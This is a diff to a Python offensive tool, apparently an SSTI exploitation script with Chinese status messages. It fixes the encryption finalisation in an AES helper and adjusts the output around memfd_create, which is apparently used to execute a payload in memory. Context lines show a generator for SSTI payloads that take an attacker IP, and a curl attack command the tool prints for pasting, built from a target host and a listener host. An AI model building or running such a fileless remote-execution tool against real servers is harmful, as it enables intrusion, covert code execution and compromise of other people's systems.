@@ -80,6 +80,8 @@ _lc.EVP_EncryptInit_ex.restype = ctypes.c_int
 _lc.EVP_EncryptInit_ex.argtypes = [ctypes.c_void_p,ctypes.c_void_p,ctypes.c_void_p,ctypes.c_char_p,ctypes.c_char_p]
 _lc.EVP_EncryptUpdate.restype = ctypes.c_int
 _lc.EVP_EncryptUpdate.argtypes = [ctypes.c_void_p,ctypes.c_char_p,ctypes.POINTER(ctypes.c_int),ctypes.c_char_p,ctypes.c_int]
+_lc.EVP_EncryptFinal_ex.restype = ctypes.c_int
+_lc.EVP_EncryptFinal_ex.argtypes = [ctypes.c_void_p,ctypes.c_char_p,ctypes.POINTER(ctypes.c_int)]
 _lc.EVP_CIPHER_CTX_free.restype = None
 _lc.EVP_CIPHER_CTX_free.argtypes = [ctypes.c_void_p]
 AK = hashlib.sha256(SS).digest()
@@ -90,7 +92,9 @@ def _ac(d, iv):
     o = ctypes.create_string_buffer(len(d)+32)
     n = ctypes.c_int(0)
     _lc.EVP_EncryptUpdate(ctx, o, ctypes.byref(n), d, len(d))
-    r = o.raw[:n.value]
+    f = ctypes.c_int(0)
+    _lc.EVP_EncryptFinal_ex(ctx, ctypes.cast(ctypes.byref(o, n.value), ctypes.c_char_p), ctypes.byref(f))
+    r = o.raw[:n.value + f.value]
     _lc.EVP_CIPHER_CTX_free(ctx)
     return r
 
@@ -367,14 +371,6 @@ def _get_memfd_syscall_nr() -> int:
         print(f"[!] 未知架構 {machine}，預設使用 x86_64 memfd_create syscall #319")
         nr = 319
     return nr
-
-def _find_python3_path() -> str:
-    """Find python3 binary path for use in loader execve."""
-    for p in ['/usr/bin/python3', '/usr/local/bin/python3', '/bin/python3']:
-        if os.path.isfile(p):
-            return p
-    # fallback: use sys.executable (works on most systems)
-    return '/usr/bin/env python3'
 
 
 def generate_ssti_payload(attacker_ip: str) -> str:
@@ -659,9 +655,10 @@ def main():
             print(f"  → 強制跳過: 加上 --skip-check 參數")
             sys.exit(1)
 
-    # ── 架構資訊 ──
+    # ── 架構資訊 (本機，靶機端 loader 會自動偵測) ──
     memfd_nr = _get_memfd_syscall_nr()
-    print(f"  [INFO]  memfd_create syscall #{memfd_nr} ({platform.machine()})")
+    print(f"  [INFO]  本機架構 {platform.machine()} (memfd syscall #{memfd_nr})")
+    print(f"  [INFO]  靶機端 loader 會自動偵測目標架構的 syscall 號碼")
 
     print("\n\033[93m[*] SSTI attack command (paste into another terminal):\033[0m\n")
     print(f"  {generate_curl_command(args.target, args.port, args.lhost)}\n")
